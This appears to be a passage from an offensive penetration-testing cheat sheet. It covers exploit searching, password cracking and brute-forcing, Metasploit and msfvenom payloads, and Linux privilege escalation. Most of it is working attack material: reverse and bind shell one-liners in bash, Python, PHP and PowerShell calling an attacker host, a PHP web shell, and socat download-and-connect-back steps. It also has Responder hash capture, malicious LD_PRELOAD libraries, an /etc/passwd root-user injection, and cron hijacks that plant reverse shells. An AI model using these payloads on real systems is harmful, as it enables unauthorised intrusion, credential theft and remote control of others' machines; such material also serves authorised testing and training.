| Race Condition                     | Identify functionality with a limited resource (e.g., "first 100 users get a discount", "one vote per user").                                                                                                                      | Use Burp Suite Repeater. Send one request to Repeater, create a tab group with many copies, and send the group in parallel to bypass the logic checks.                                                                                                       |

# ⚡ Gain Access/Exploit

The exploitation phase focuses on gaining initial access to target systems through various attack vectors.

- https://www.exploit-db.com/
- https://www.rapid7.com/db/
- https://github.com/search.html
    - `CVE-2022-22965 in:file`
    - `"remote code execution" in:file language:python`
    - `wordpress "authenticated" "rce" in:name in:description language:php stars:>=10`
    - `"Apache Struts" RCE in:file language:ruby`
    - `"proof of concept" "poc" in:name language:go`
    - `"buffer overflow" "exploit" in:file`
- `searchsploit`
```bash
# Update Searchsploit
searchsploit --update
# Search
searchsploit "<SERVICE_VERSION>" | grep -iE 'remote|rce|privilege|lpe|code execution|backdoor' | grep -vE 'dos|denial|poc' > searchsploit_$(date +%Y-%m-%d_%H%M).txt
```
- https://nvd.nist.gov/vuln/search#/nvd/home

## 🔓 Cracking Passwords

Use context and examples like below to ascertain the hashing algorithm:
- https://hashcat.net/wiki/doku.php?id=example_hashes

Hashes ID:
- https://hashes.com/en/tools/hash_identifier

Crack hashes:
- https://crackstation.net/
- https://hashes.com/en/decrypt/hash

### ID Hash Type

```bash
# Also read:
man 5 crypt

# Spotty: but IDs hashes
hashid '$P$8ohUJ.1sdFw09/bMaAQPTGDNi2BIUt1' > hashid_$(date +%Y-%m-%d_%H%M).txt

hash-identifier
```

## 💥 Brute-Forcing

### 🔨 Brute-Forcing Web & SSH Logins with Hydra
```bash
# Web Login brute-force (ONLINE - use small wordlist to avoid lockouts)
hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V -o hydra_web_login.txt

# Wordpress brute-force login form with a complex request string (ONLINE - use small wordlist)
hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username' -V -o hydra_wp_login.txt

# SSH brute-force; -t 4 is recommended for SSH (ONLINE - use small wordlist)
hydra -t 4 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt ssh://<TARGET>:<PORT> -o hydra_ssh_login.txt
```

### 🔨 SMB Password Spraying with CrackMapExec

Use crackmapexec to spray one password against a list of users. Stealthier and avoids lockouts.

```bash
crackmapexec smb -u users.txt -p '<PASSWORD>' <TARGET_IP>
```

## 🎯 Metasploit / Meterpreter

### 🎯 Finding and Executing Exploits
```bash
# Search for exploits related to a specific keyword
search type:exploit <KEYWORD>

# TARGET
setg RHOSTS <TARGET>
setg PORT

# PAYLOAD (callbacks usually best)
set payload php/meterpreter/reverse_tcp
setg LHOST
setg LPORT

# Run the configured exploit
run

# Windows Post-Exploit
use post/windows/gather/enum_logged_on_users
getuid
getprivs
```

### 📊 Meterpreter Survey

```bash
sysinfo
getuid
getpid
ipconfig
ps

# Linux flag search
search -d / -f flag.txt
search -d / -f user.txt
search -d / -f root.txt

# Windows flag search
search -d C:\\ -f flag.txt
search -d C:\\ -f user.txt
search -d C:\\ -f root.txt

# REMEMBER: for Windows, quoting and double slashes 
cat "C:\\Programs and Files (x86)\\"

hashdump  # CrackStation
# --- kiwi (like mimikatz) ---
load kiwi
creds_all

# === WINDOWS ===
run winenum
run post/windows/gather/checkvm
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_shares

# --- Privilege Escalation & Credential Gathering ---
run post/windows/gather/smart_hashdump
run post/multi/recon/local_exploit_suggester
```

### 🗄️ DB for Targets

```bash
# Check database status from within msfconsole
db_status

# Manage workspaces
workspace
workspace -a <name>
workspace -d <name>
workspace <name>
workspace -h

# Database Backend Commands
db_nmap <nmap_options> <target>
db_connect
db_disconnect
db_export
db_import
db_rebuild_cache
db_remove
db_save
db_status
hosts
loot
notes
services
vulns
workspace

# Using database hosts for a module
hosts -R
services -S <search_term>
```

### 🎯 Msfvenom

- **Note:** stageless payloads user underscores in the name '_' like `shell_reverse_tcp`

```bash
# Listener for reverse callbacks
use exploit/multi/handler

set payload <PAYLOAD>  # should match msfvenom
set lhost <LISTEN_IP>
set lport <LISTEN_PORT>

# Msfvenom commands
msfvenom -l payloads
msfvenom --list formats
msfvenom -p php/meterpreter/reverse_tcp LHOST=<TARGET> -f raw -e php/base64  # NOTE: need to add <?php ?> tags to file
msfvenom -p php/reverse_php LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw > reverse_shell.php  # NOTE: need to add <?php ?> tags to file
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f elf > rev_shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f exe > rev_shell.exe
msfvenom -p php/meterpreter_reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw > rev_shell.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f asp > rev_shell.asp
msfvenom -p cmd/unix/reverse_python LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw > rev_shell.py
```
### 🔍 Scans

```bash
# === Discovery Scans ===
# ARP Sweep
auxiliary/scanner/discovery/arp_sweep
# UDP Sweep
auxiliary/scanner/discovery/udp_sweep
# TCP Port Scan
auxiliary/scanner/portscan/tcp

# === Enumeration Scans ===
# SMB User Enumeration
auxiliary/scanner/smb/smb_enumusers
# SMB Share Enumeration
auxiliary/scanner/smb/smb_enumshares
# SMB Version Enumeration
auxiliary/scanner/smb/smb_version
# FTP Version
auxiliary/scanner/ftp/ftp_version
# SNMP Enumeration
auxiliary/scanner/snmp/snmp_enum
# HTTP Version
auxiliary/scanner/http/http_version

# === Vulnerability Checks ===
# EternalBlue MS17-010 Vulnerability Check
auxiliary/scanner/smb/smb_ms17_010
# HTTP Options
auxiliary/scanner/http/http_options
```

## 🐚 Reverse & Bind Shells

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://github.com/danielmiessler/SecLists/tree/master/Web-Shells

### 💻 Shell One-Liners

- RECOMMENDED: 53, 80, 139, 443, 445 or 8080
    - Target -> Attacker (**callback**)
    - likely to bypass firewalls
    - `sudo` is required for ports <1024

```bash
# Check if a flavor of netcat exists
{ command -v nc && command -v netcat && command -v ncat ; } 2>/dev/null ; if command -v busybox >/dev/null; then busybox nc -h 2>/dev/null | head -n 1 && echo "'busybox nc' exists."; fi
```
#### 📞 Reverse Shells

##### 👂 Local: LISTENER

```bash
rlwrap nc -vnlp <PORT>
```

##### 📞 Target: CALLBACK

```bash
# Reverse shell using a named pipe (fifo)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <KALI_IP> <PORT> > /tmp/f
```

#### 🔗 Forward Shells

##### 🔗 Target: BIND

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 <PORT> > /tmp/f
```

##### 🔗 Target: CONNECT

```bash
nc -nv <TARGET> <PORT>
```

#### 🐚 Other Shells to port 443

| Language/Tool      | Command                                                                                                                                                                                                                       | Description                                                                                            |
| :----------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :----------------------------------------------------------------------------------------------------- |
| **Bash**           |                                                                                                                                                                                                                               |                                                                                                        |
| Bash               | `bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'`                                                                                                                                                                          | The most common interactive bash reverse shell. Redirects standard output and error over a TCP socket. |
| Bash               | `exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 \| while read line; do $line 2>&5 >&5; done`                                                                                                                                       | Creates a new file descriptor (5) for the TCP socket and executes commands received in a loop.         |
| Bash               | `0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196`                                                                                                                                                            | Uses a specific file descriptor (196) to manage the I/O for the reverse shell connection.              |
| Bash               | `bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5`                                                                                                                                                                         | Creates an interactive shell and redirects stdin, stdout, and stderr through file descriptor 5.        |
| **PHP**            |                                                                                                                                                                                                                               |                                                                                                        |
| PHP (`exec`)       | `php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'`                                                                                                                                                        | Opens a TCP socket and uses the `exec()` function to execute a shell.                                  |
| PHP (`shell_exec`) | `php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'`                                                                                                                                                  | Similar to the above, but uses the `shell_exec()` function.                                            |
| PHP (`system`)     | `php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'`                                                                                                                                                      | Uses the `system()` function to execute the shell and display the output.                              |
| PHP (`passthru`)   | `php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'`                                                                                                                                                    | Uses the `passthru()` function, which is useful for binary data.                                       |
| PHP (`popen`)      | `php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'`                                                                                                                                                  | Uses `popen()` to open a process pipe and execute the shell.                                           |
| **Python**         |                                                                                                                                                                                                                               |                                                                                                        |
| Python             | `export RHOST="ATTACKER_IP"; export RPORT=443; python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'`  | Sets attacker info as environment variables, then connects and spawns a fully interactive PTY shell.   |
| Python             | `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'` | A very common and reliable one-liner that connects and spawns a PTY shell.                             |
| Python             | `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`                                                                                 | A more compact version of the standard Python PTY reverse shell.                                       |
| **Other Tools**    |                                                                                                                                                                                                                               |                                                                                                        |
| Telnet             | `TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF \| sh 1>$TF`                                                                                                                                                     | Creates a named pipe (FIFO) and uses `telnet` to shuttle shell I/O to the attacker.                    |
| AWK                | `awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; ...}' /dev/null`                                                                                                                                                              | Uses AWK's built-in networking capabilities to create a reverse shell client.                          |
| BusyBox            | `busybox nc ATTACKER_IP 443 -e sh`                                                                                                                                                                                            | Uses the `nc` applet within BusyBox with the `-e` flag to execute a shell upon connection.             |

### 🐘 PHP Webshells

- Beachhead: https://github.com/flozz/p0wny-shell
- Post-Exploit: https://github.com/wso-shell-php/.github

`/usr/share/webshells`
- https://github.com/payloadbox/command-injection-payload-list

#### 📤 Upload command executor
```php
// cmd.php
<?php system($_GET['cmd']); ?>
```
#### ▶️ Run commands
```bash
curl http://<TARGET>/cmd.php?cmd=ls > cmd_output_$(date +%Y-%m-%d_%H%M).txt
```

---

#### 👂 Start Listener
```bash
nc -lvnp 54321
```

#### 📤 Upload reverse shell to execute netcat
**MAKE SURE NETCAT IS ON TARGET**
```php
<?php
  $cmd = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <LISTEN_IP> <PORT> > /tmp/f";
  system($cmd);
?>
```

### 🪟 Windows Webshell

```powershell
# REPLACE <IP> and <PORT>
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

## 🛠️ Post-Exploitation

Post-exploitation focuses on maintaining access, gathering information, escalating privileges, and preparing for lateral movement.

## 🛑 Responder - NTLM Hash Capture

```bash
# Configure listening services in: /etc/responder/Responder.conf
sudo responder -I <INTERFACE>

# Trigger NTLM authentication via LFI vulnerability
curl -o- <URL>/index.php?page=//<CALLBACK_IP>/somefile

# Capture NTLMv2-SSP Hash format: <USER>:<HOST>:<HASH>...

# Use evil-winrm to access machine with captured credentials
evil-winrm -i <HOST> -u <USER> -p <PASSWORD>

# Search for flags on Windows
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Name flag.txt
```

## ⬆️ Shell Upgrades

Upgrade a simple shell to a more interactive PTY.

### 🐍 Python Method

```bash
# === STEP 1 ===

# Terminal
for i in python3 python python2; do command -v "$i" >/dev/null && "$i" -c 'import pty; pty.spawn("/bin/bash")' && exit; done

# Meterpreter
execute -f 'python -c "import pty; pty.spawn(\"/bin/bash\")"' -i -t

# === STEP 2 ===

# Interpret terminal escape codes
export TERM=xterm

# === STEP 3 ===

CTRL+Z (background)

# Stabilize a shell from terminal escape commands
stty raw -echo; fg

# === OPTIONAL ===

echo "stty rows $(tput lines) columns $(tput cols)"
stty rows <ABOVE> columns <ABOVE>

# === SHELL DIES ===

reset  # to re-enable disabled echo
```

#### 📏 Resize Terminal

```bash
# RUN THIS OUTSIDE of remote shell
# THEN run the output inside the remote shell
stty size | awk '{printf "stty rows %s cols %s\n", $1, $2}'
# --- OR ---
stty -a | grep -o "rows [0-9]*; columns [0-9]*" | awk '{print "stty", $2, $4}'
```

### 🔧 Socat Method

- https://github.com/andrew-d/static-binaries/tree/master/binaries
- https://github.com/ernw/static-toolbox/

```bash
#====================================================================
# STEP 1: ATTACKER - One-Time Setup (Get & Serve socat)
#====================================================================

cd /tmp
# Download static Linux binary
wget -v https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
# Get your IP and serve the directory on port 80
ip a ; sudo python3 -m http.server 80

#====================================================================
# A) STANDARD (Unencrypted) SHELLS
#====================================================================

wget http://<ATTACKER_IP>/socat

#--------------------------------------------------------------------
# LINUX TARGET (Fully Stable TTY Shell)
#--------------------------------------------------------------------

# ATTACKER (Listen):
socat file:`tty`,raw,echo=0 tcp-listen:<PORT>

# LINUX TARGET (Connect Back):
wget http://<KALI_IP>:80/socat -o /tmp/socat
chmod +x /tmp/socat
nohup /tmp/socat tcp-connect:<KALI_IP>:<PORT> exec:'bash -li',pty,stderr,setsid,sigint,sane 2>&1 >/dev/null &

#--------------------------------------------------------------------
# WINDOWS TARGET (Simple Shell)
#--------------------------------------------------------------------

# ATTACKER (Listen):
socat tcp-listen:<PORT> -

# WINDOWS TARGET (Connect Back):
Invoke-WebRequest -uri http://<KALI_IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
C:\\Windows\temp\socat.exe TCP:<KALI_IP>:<PORT> EXEC:powershell.exe,pipes


#====================================================================
# B) OPENSSL (Encrypted) SHELLS
#====================================================================

#--------------------------------------------------------------------
# ATTACKER: One-Time Setup (Generate Certificate)
#--------------------------------------------------------------------
# Generate key and cert (fill info randomly or leave blank)
openssl req -x509 -newkey rsa:2048 -keyout shell.key -out shell.crt -days 365 -nodes -batch -subj "/"
# Combine into a single PEM file for socat
cat shell.key shell.crt > shell.pem

#--------------------------------------------------------------------
# LINUX TARGET (Encrypted Stable TTY Shell)
#--------------------------------------------------------------------

# ATTACKER (Listen):
socat FILE:`tty`,raw,echo=0 OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 

# LINUX TARGET (Connect Back):
# (Upload socat first, same as standard shell)
/tmp/socat EXEC:'bash -li',pty,stderr,setsid,sigint,sane OPENSSL:<KALI_IP>:<PORT>,verify=0 

#--------------------------------------------------------------------
# WINDOWS TARGET (Encrypted Simple Shell)
#--------------------------------------------------------------------

# ATTACKER (Listen):
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

# WINDOWS TARGET (Connect Back):
# (Upload socat.exe first, same as standard shell)
C:\\Windows\temp\socat.exe EXEC:powershell.exe,pipes OPENSSL:<KALI_IP>:<PORT>,verify=0
```

## 🐚 Netcat and PowerShell shells

```bash
# === REVERSE SHELL ===

# ATTACKER (Listen):
nc -lvnp <PORT>

# LINUX TARGET (Connect Back):
nc <ATTACKER_IP> <PORT> -e /bin/bash

# WINDOWS TARGET (Connect Back):
# /usr/share/windows-resources/binaries/nc.exe
nc.exe <ATTACKER_IP> <PORT> -e cmd.exe

# === BIND SHELL ===

# LINUX TARGET (Listen):
nc -lvnp <PORT> -e /bin/bash

# WINDOWS TARGET (Listen):
nc.exe -lvnp <PORT> -e cmd.exe

# ATTACKER (Connect):
nc <TARGET> <PORT>

# === NETCAT SHELLS (Modern Linux, without -e flag) ===

# REVERSE SHELL
# ATTACKER (Listen):
nc -lvnp <PORT>

# LINUX TARGET (Connect Back):
mkfifo /tmp/f; nc <ATTACKER_IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# --- BIND SHELL ---

# LINUX TARGET (Listen):
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# ATTACKER (Connect):
nc <TARGET> <PORT>

# --- POWERSHELL REVERSE SHELL (Windows Only) ---

# ATTACKER (Listen):
nc -lvnp <PORT>

# WINDOWS TARGET (Connect Back):
# (Execute this one-liner in a cmd.exe or powershell prompt)
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## 🐧 Linux Survey

```bash
#!/bin/bash

# ===============================================================
# ===      FINAL, FOCUSED & ROBUST LINUX PRIV-ESC SURVEY      ===
# ===============================================================

# --- Configuration: Add binaries to ignore to these lists, separated by "|" ---
SUID_IGNORE_LIST="chsh|gpasswd|newgrp|chfn|passwd|sudo|su|ping|ping6|mount|umount|Xorg\.wrap|ssh-keysign"
SGID_IGNORE_LIST="wall|ssh-agent|mount|umount|utempter"

# --- Main Survey Execution ---
(
echo "===== WHO AM I? =====";
whoami; id; pwd; hostname;

echo -e "\n===== OS & KERNEL INFO =====";
uname -a;
cat /etc/issue;
cat /etc/os-release;

echo -e "\n===== INTERESTING SUID FILES (FILTERED) =====";
echo "Review this list carefully. Check GTFOBins for each binary: https://gtfobins.github.io/";
find / -perm -u=s -type f 2>/dev/null | grep -vE "/(${SUID_IGNORE_LIST})$";

echo -e "\n===== INTERESTING SGID FILES (FILTERED) =====";
find / -perm -g=s -type f 2>/dev/null | grep -vE "/(${SGID_IGNORE_LIST})$";

echo -e "\n===== LINUX CAPABILITIES (MODERN PRIVESC) =====";
echo "Check GTFOBins for any binary with '+ep' privileges.";
getcap -r / 2>/dev/null;

# --- [NEW] Section for explicit, high-impact file permission checks ---
echo -e "\n===== CRITICAL FILE PERMISSIONS =====";
echo "--- /etc/passwd ---";
ls -la /etc/passwd;
echo "--- /etc/shadow ---";
ls -la /etc/shadow;

echo -e "\n===== WORLD-WRITABLE FILES & DIRECTORIES =====";
find / -type d -perm -0002 -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null;
find / -type f -perm -0002 -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null;

echo -e "\n===== DIRECTORY CONTENTS =====";
echo "--- Current Folder (from messy exploit) ---";
ls -la .;
echo "--- Root Filesystem ---";
ls -la /;
echo "--- Current User's Home (\$HOME) ---";
ls -la $HOME;
echo -e "\n--- All Users in /home ---";
for user_dir in /home/*; do
  if [ -d "${user_dir}" ]; then
    echo -e "\n[+] Contents of ${user_dir}:";
    ls -la "${user_dir}";
  fi
done;

echo -e "\n===== RUNNING PROCESSES =====";
ps aux;

# --- [ENHANCED] Section now checks permissions of scheduled tasks ---
echo -e "\n===== CRON JOBS / SCHEDULED TASKS =====";
ls -la /etc/cron*;
echo -e "\n--- /etc/crontab Contents ---";
cat /etc/crontab;
echo -e "\n--- Checking Permissions of Scripts in /etc/crontab ---";
# This part parses crontab, finds the commands, and checks if they are writable
while read -r line; do
    # Ignore comments and empty lines
    if [[ "$line" =~ ^\s*# || -z "$line" ]]; then
        continue
    fi
    # Extract the command part of the line
    cmd=$(echo "$line" | awk '{for(i=6;i<=NF;i++) printf "%s ", $i; print ""}')
    # Find the full path of the command
    cmd_path=$(which $cmd 2>/dev/null)
    if [ -n "$cmd_path" ] && [ -w "$cmd_path" ]; then
        echo "[!!!] VULNERABLE: Cron job command is writable: $cmd_path"
        ls -la "$cmd_path"
    fi
done < <(grep -vE '^PATH=' /etc/crontab)

echo -e "\n===== NETWORK INFO & OPEN PORTS (LOCAL) =====";
# Failsafe: Tries to use netstat, but falls back to ss if it's not available.
command -v netstat &>/dev/null && netstat -tulpn || ss -tulpn;

# --- [NEW] Section for NFS share enumeration ---
echo -e "\n===== NFS SHARES =====";
echo "--- /etc/exports (Server-side config) ---";
cat /etc/exports 2>/dev/null || echo "Not found.";
echo -e "\n--- showmount (Client-side check) ---";
command -v showmount &>/dev/null && showmount -e 127.0.0.1 || echo "showmount command not found.";

# Note: The -n flag makes this non-interactive. It will only show sudo rights
# if the user has NOPASSWD configured. A manual 'sudo -l' is still recommended.
echo -e "\n===== CAN I RUN SUDO? (NON-INTERACTIVE CHECK) =====";
sudo -n -l;

echo -e "\n===== SENSITIVE CONTENT SEARCH (LAST - CAN BE NOISY) =====";
echo "--- id_rsa ---"
find /home -name "id_rsa*" 2>/dev/null;
echo "--- grep pass ---"
grep --color=auto -rni "password\|pass" /etc /var/www /home 2>/dev/null;

echo -e "\n===== SURVEY COMPLETE =====\n";

) 2>&1 | tee /tmp/linux_survey_output.txt
```

```bash
# Retrieve survey
scp -P <PORT> <USER>@<IP_ADDR>:/tmp/linux_survey_output.txt /tmp/
```

## 🚫 No Netstat nor SS

Sometimes, some routers or mini-environments might not have the full core utils suite. As long as `/proc/net` is readable, then it is also parsable with the following monstrosity.

### 🔌 TCP and TCP6 /proc Netstat (no UDP)

```bash
{ printf "%-8s %-22s %-22s %-12s %s\n" "Proto" "Local Address" "Remote Address" "State" "PID/Program Name"; awk 'function hextodec(h,r,i,c,v){h=toupper(h);r=0;for(i=1;i<=length(h);i++){c=substr(h,i,1);if(c~/[0-9]/)v=c;else v=index("ABCDEF",c)+9;r=r*16+v}return r} function hextoip(h,ip,d1,d2,d3,d4){if(length(h)==8){d1=hextodec(substr(h,7,2));d2=hextodec(substr(h,5,2));d3=hextodec(substr(h,3,2));d4=hextodec(substr(h,1,2));return d1"."d2"."d3"."d4}if(length(h)>8){if(hextodec(h)==0)return"::";if(substr(h,1,24)=="0000000000000000FFFF0000"){h=substr(h,25,8);d1=hextodec(substr(h,7,2));d2=hextodec(substr(h,5,2));d3=hextodec(substr(h,3,2));d4=hextodec(substr(h,1,2));return"::ffff:"d1"."d2"."d3"."d4}return h}} NR>1{split($2,l,":");split($3,r,":");lip=hextoip(l[1]);lport=hextodec(l[2]);rip=hextoip(r[1]);rport=hextodec(r[2]);sm["01"]="ESTABLISHED";sm["0A"]="LISTEN";if($4 in sm){if(FILENAME~/tcp6/)p="tcp6";else p="tcp";printf"%-8s %-22s %-22s %-12s %s\n",p,lip":"lport,rip":"rport,sm[$4],$10}}' /proc/net/tcp /proc/net/tcp6 | while read proto laddr raddr state inode; do find_output=$(find /proc -path '*/fd/*' -lname "socket:\[$inode\]" -print -quit 2>/dev/null); if [ -n "$find_output" ]; then pid=$(echo "$find_output" | cut -d'/' -f3); pname=$(cat /proc/$pid/comm 2>/dev/null); printf "%-8s %-22s %-22s %-12s %s/%s\n" "$proto" "$laddr" "$raddr" "$state" "$pid" "$pname"; else printf "%-8s %-22s %-22s %-12s %s\n" "$proto" "$laddr" "$raddr" "$state" "-"; fi; done | sort -k4; }
```

## ⬆️ Privilege Escalation (PrivEsc)

### 🔧 SUDO Escalation

#### Sudo Shell Escapes (GTFOBins)
```bash
# Identification: Check for binaries the user can run with NOPASSWD
sudo -l

# === Exploitation: Find the binary on GTFOBins ===
# https://gtfobins.github.io/

# Exploit w/ 'find'
sudo find . -exec /bin/sh \; -quit

# Exploit w/ 'awk'
sudo awk 'BEGIN {system("/bin/sh")}'

# Exploit w/ 'vim'
sudo vim -c ':!/bin/sh'
```

#### Sudo with LD_PRELOAD / LD_LIBRARY_PATH
```bash
# Identification: Check if env_keep preserves LD_PRELOAD or LD_LIBRARY_PATH
sudo -l | grep 'env_keep.*LD_'

# Exploitation (LD_PRELOAD):
# 1. Create malicious shared object file
echo '#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash -p");
}' > /tmp/preload.c

# 2. Compile the .so file
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c

# 3. Run sudo command with preloaded library
sudo LD_PRELOAD=/tmp/preload.so <command_from_sudo-l>
```

### 🔒 File Permissions & Attributes

#### SUID/SGID - Shared Object (.so) Injection
```bash
# Identification: Find custom SUID/SGID binaries
find / -type f -perm -u=s 2>/dev/null

# Use strace to see if it loads non-existent .so files from writable paths
strace /path/to/suid-binary 2>&1 | grep -iE "open.*\.so.*no such file"

# Exploitation:
# 1. Create malicious .so file with discovered name
echo '#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
void _init() {
    setgid(0); setuid(0);
    system("/bin/bash -p");
}' > /path/to/writable/dir/hijacked.so

# 2. Compile it
gcc -shared -fPIC -o /path/to/writable/dir/hijacked.so /path/to/writable/dir/hijacked.so.c

# 3. Run the SUID binary (will load your malicious library)
/path/to/suid-binary
```

#### Capabilities Escalation
```bash
# Identification: Search for binaries with capabilities set
getcap -r / 2>/dev/null
// cap_setuid+ep

# --- Exploitation: If set, use it to become root ---

# vim example
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'
```

#### Writable System Files
```bash
# Exploitation (/etc/passwd):
# 1. Generate password hash for new root user
openssl passwd -1 -salt <USERNAME> <PASSWORD>

# 2. Add new user with UID 0 to /etc/passwd
echo 'newroot:<HASH_HERE>:0:0:root:/root:/bin/bash' >> /etc/passwd

# 3. Log in
su newroot

# Exploitation (/etc/shadow):
# 1. Generate SHA-512 hash for root user
openssl passwd -6 <PASSWORD>

# 2. Replace root hash in /etc/shadow (requires write method)
```

#### Readable /etc/shadow
```bash
# Identification: Check if /etc/shadow is world-readable
ls -la /etc/shadow

# Exploitation:
# 1. Copy passwd and shadow files
cp /etc/passwd .
cp /etc/shadow .

# 2. Combine for John the Ripper
unshadow passwd shadow > hashes.txt

# 3. Crack the hashes
john --wordlist=/usr/share/wordlists/rockyou.txt --output=jonh_cracked_hashes.txt hashes.txt
```

### ⏰ Scheduled Tasks (Cron Jobs)

#### Writable Cron Script
```bash
# Identification: Check for writable scripts run by root cron jobs
cat /etc/crontab
ls -la /path/to/script.sh

# Exploitation: Overwrite script with reverse shell payload
echo '#!/bin/bash' > /path/to/script.sh
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' >> /path/to/script.sh
# Wait for cron job to execute
```

#### Cron PATH Hijacking
```bash
# Identification: Root cron job uses relative path in writable directory
cat /etc/crontab

# Exploitation: Create malicious script with same name in writable directory
echo '#!/bin/bash' > /home/user/backup.sh
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' >> /home/user/backup.sh
chmod +x /home/user/backup.sh
# Wait for cron job to run
```

#### Cron Wildcard Injection
```bash
# Identification: Root cron job runs command with wildcard in writable directory
# Example: cd /home/user && tar czf /backups/archive.tar.gz *
cat /etc/crontab

# Exploitation:
# 1. Create reverse shell payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell

# 2. Create specially named files to exploit wildcard and tar's checkpoint feature
touch '--checkpoint=1'
touch '--checkpoint-action=exec=./shell'
```

### 🌐 Network Services (NFS)

#### NFS with no_root_squash
```bash
# Identification (on Attacker Machine):
showmount -e <TARGET>

# Exploitation (on Attacker Machine):
# 1. Create mount point and mount the share
mkdir /tmp/nfs_mount
sudo mount -o rw <TARGET>:<SHARE_PATH> /tmp/nfs_mount

# 2. Create malicious C file on the mount
echo '#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void main() {
